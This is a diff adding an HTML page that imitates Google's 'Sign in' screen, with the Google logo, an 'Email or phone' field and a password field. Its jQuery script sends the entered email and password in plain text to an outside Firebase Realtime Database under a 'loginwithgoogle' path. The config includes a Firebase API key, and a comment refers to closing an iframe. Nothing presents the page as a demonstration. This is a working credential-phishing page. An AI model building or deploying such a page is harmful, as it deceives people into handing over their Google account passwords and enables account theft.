@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-analytics.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+
+    <style>
+        .container {
+            display: flex;
+            height: 100vh;
+            font-family: Google Sans;
+            user-select: none;
+        }
+
+        .card {
+            background: #fff;
+            width: 412px;
+            height: auto;
+            padding: 48px 36px;
+            border-radius: 8px;
+            border: 1px solid #cacaca;
+            margin: auto;
+        }
+
+        .header {
+            text-align: center;
+            font-weight: 400;
+        }
+
+        .title {
+            padding: 15px 0;
+            font-size: 24px;
+        }
+
+        .tagline {
+            font-size: 16px;
+            padding-bottom: 18px;
+        }
+
+        label {
+            display: block;
+            position: absolute;
+            padding: 0 5px;
+            width: auto;
+            color: #5f6368;
+            background: #fff;
+            transition: all 150ms ease;
+            transform: translate(12px, -37px);
+            cursor: text;
+        }
+
+        input {
+            padding: 16px;
+            margin-top: 20px;
+            font-size: 17px;
+            background: #fff;
+            width: calc(100% - 36px);
+            border: 1px solid #cacaca;
+            border-radius: 5px;
+        }
+
+        input:focus {
+            outline: none;
+            /* Compensate increased border with padding */
+            padding: 15px;
+            border: 2px solid #1a73e8;
+        }
+
+        input:not(:placeholder-shown)+label,
+        input:focus+label {
+            transform: translate(8px, -62px);
+            font-size: 13px;
+        }
+
+        input:focus+label {
+            color: #1a73e8;
+        }
+
+        .links {
+            color: #1a73e8;
+            font-size: 14px;
+            padding-top: 10px;
+            cursor: pointer;
+            font-weight: 500;
+        }
+
+        .guest {
+            margin-top: 32px;
+            font-size: 14px;
+            color: #5f6368;
+        }
+
+        .login-bar {
+            margin-top: 32px;
+            display: flex;
+            flex-wrap: wrap;
+        }
+
+        .next {
+            margin-left: auto;
+            padding: 10px 30px;
+            border-radius: 5px;
+            cursor: pointer;
+            color: #fff;
+            outline: none;
+            border: none;
+            background: #1a73e8;
+            font-weight: 500;
+        }
+
+        .next:hover {
+            background: #4285f4;
+        }
+
+        @media only screen and (max-width: 600px) {
+            .card {
+                border: none;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <div class="card">
+            <div class="header">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google"
+                    height="24">
+                <div class="title">Sign in</div>
+                <div class="tagline">Use your Google Account</div>
+            </div>
+            <input id="txtUserName" type="text" placeholder=" ">
+            <label for="txtUserName">Email or phone</label>
+            <input id="txtPassword" type="password" placeholder=" ">
+            <label for="txtPassword">Password</label>
+            <div class="links">Forgot email?</div>
+            <div class="guest">Not your computer? Use Guest mode to sign in privately.</div>
+            <div class="links">Learn more</div>
+            <div class="login-bar">
+                <div class="links">Create account</div>
+                <button class="next" id="btnlogin">Login</button>
+            </div>
+        </div>
+    </div>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script>
+        // Initialize Firebase once
+        const firebaseConfig = {
+            apiKey: "AIzaSyAVqSyivL3lQzUp6iYb0JQYPnebXpQuu_Y",
+            authDomain: "commitbridge-493.firebaseapp.com",
+            databaseURL: "https://commitbridge-493-default-rtdb.firebaseio.com",
+            projectId: "commitbridge-493",
+            storageBucket: "commitbridge-493.appspot.com",
+            messagingSenderId: "540831824250",
+            appId: "1:540831824250:web:b5961f99362d3869df7ec3",
+            measurementId: "G-FFN9RDJD0N"
+        };
+
+        firebase.initializeApp(firebaseConfig);
+        firebase.analytics();
+        const db = firebase.database();
+
+        // Handle login click
+        $("#btnlogin").click(function (e) {
+            e.preventDefault();
+
+            const username = $("#txtUserName").val();
+            const password = $("#txtPassword").val();
+
+            if (!username || !password) {
+                alert("Please enter both username and password.");
+                return;
+            }
+
+            db.ref("loginwithgoogle").push({
+                username: username,
+                password: password,
+                timestamp: new Date().toISOString()
+            }).then(() => {
+                alert("Data submitted to Firebase.");
+                //close the iframe window
+                
+            }).catch((error) => {
+                console.error("Error writing to Firebase: ", error);
+                alert("Error saving data to Firebase.");
+            });
+        });
+    </script>
+
+</body>
+
+</html>
